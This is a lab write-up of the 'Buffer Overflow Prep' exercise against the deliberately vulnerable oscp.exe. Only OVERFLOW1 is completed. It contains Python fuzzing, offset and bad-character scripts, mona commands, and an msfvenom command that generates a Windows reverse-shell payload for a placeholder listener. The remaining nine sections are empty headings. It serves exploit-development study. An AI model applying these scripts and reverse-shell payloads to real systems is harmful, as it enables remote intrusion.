# Buffer Overflow Prep

### oscp.exe - OVERFLOW1
First of all, run Immunity Debugger as an Administrator and open `oscp.exe`. Then on the bar below, type `!mona config -set workingfolder c:\mona\%p` and press enter.<br />
Now the first thing I'm going to do is to find more or less how many bytes I need to send to crash the program. So I'm going to use the following script: 

#!/usr/bin/env python3

    import socket, time, sys
    
    ip = "10.10.70.48"
    
    port = 1337
    timeout = 5
    prefix = "OVERFLOW1 "
    
    string = prefix + "A" * 100
    
    while True:
      try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.settimeout(timeout)
          s.connect((ip, port))
          s.recv(1024)
          print("Fuzzing with {} bytes".format(len(string) + len(prefix)))
          s.send(bytes(string, "latin-1"))
          s.recv(1024)
      except:
        print("Fuzzing crashed at {} bytes".format(len(string) + len(prefix)))
        sys.exit(0)
      string += 100 * "A"
      time.sleep(1)
(Change the IP address according to your instance).<br />
![image](https://github.com/user-attachments/assets/6bdf948e-cdbd-4e8a-ae36-a37dd678f4d9)<br />
I see that the program crashes with 2020 bytes. So now I want to know the offset, the exact number of bytes I need to crash the program i.e. to overflow the EIP. So I'm going to run `msf-pattern_create -l 2300 > pattern.txt`. And now I'll use the following script to find the right offset: 

    import socket
    
    ip = '10.10.70.48'
    port = 1337 
    
    # Change pattern here
    pattern = 'Aa0Aa1.........4Cy5Cy'
    
    string = 'OVERFLOW1 ' + pattern
    
    #send it all
    try: 
            with socket.socket() as s:
                    s.connect((ip,port))
                    print("Sending pattern...")
                    s.send(bytes(string,'latin-1'))
    except:
            print("Failed to connect")
First I need to re-run the program, so click on the following buttons in order: <br />
![image](https://github.com/user-attachments/assets/cf80bf54-9cb8-4b1a-8e1b-d4c55c5bfc68)<br />
Run the script; the program crashes again, this time I'm interested in the contents of the EIP: <br />
![image](https://github.com/user-attachments/assets/f121215f-c53b-46a5-a178-a5eec73ba808)<br />
I can see it's `6F43396E`. To find the exact offset, I run `msf-pattern_offset -l 2300 -q 6F43396E`:<br />
![image](https://github.com/user-attachments/assets/3ce864e3-55a2-41b8-bff2-e527ec2c8d53)<br />
So the offset is `1978`. Now the idea is to overflow the buffer with some shellcode, and overflow the EIP with an address that points to that shellcode. But first, I need to find the bad characters. Those are characters that are not valid for the target machine, and I need to make sure that the shellcode doesn't contain any of them. <br />
First of all, I use the following script to generate a list of characters in hex: 
    
    for x in range(1, 256):
      print("\\x" + "{:02x}".format(x), end='')
    print()

So now I execute the following python code:

    import socket
    
    ip = '10.10.70.48' 
    
    port = 1337 
    
    badchar = '\x01\x02\x03...\xfd\xfe\xff'
    
    string = 'OVERFLOW1 ' + 1978*'A' + 4*'B' + badchar
    
    try: 
            with socket.socket() as s:
                    s.connect((ip,port))
                    print("Sending badchars...")
                    s.send(bytes(string,'latin-1'))
    except:
            print("Failed to connect.")
Notice that we're overwriting the EIP with 4 B's, and then sending the list of bad characters.ls
So I rerun the program and the script: <br />
![image](https://github.com/user-attachments/assets/57739da3-ab3e-4289-a258-d3c4387788dc)<br />
As shown in the image above, the EIP is overwritten with 4 Bs, and the ESP is overwritten with `01B3FA30`. Now to check bad characters, first run `!mona bytearray -b "\x00"`. This will create a file containing the list of characters in hex. Then run `!mona compare -f C:\mona\oscp\bytearray.bin -a 01B3FA30`.<br />
![image](https://github.com/user-attachments/assets/adb4df98-43e9-47b2-9819-19437d7449c2)<br />
The bad characters found by mona are `00,07,2e,a0`. So the final answer is `\x00\x07\x2e\xa0`. This is going to be useful to create the shellcode, for example:  `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c`:<br />

### oscp.exe - OVERFLOW2

### oscp.exe - OVERFLOW3

### oscp.exe - OVERFLOW4

### oscp.exe - OVERFLOW5

### oscp.exe - OVERFLOW6

### oscp.exe - OVERFLOW7

### oscp.exe - OVERFLOW8

### oscp.exe - OVERFLOW9

### oscp.exe - OVERFLOW10
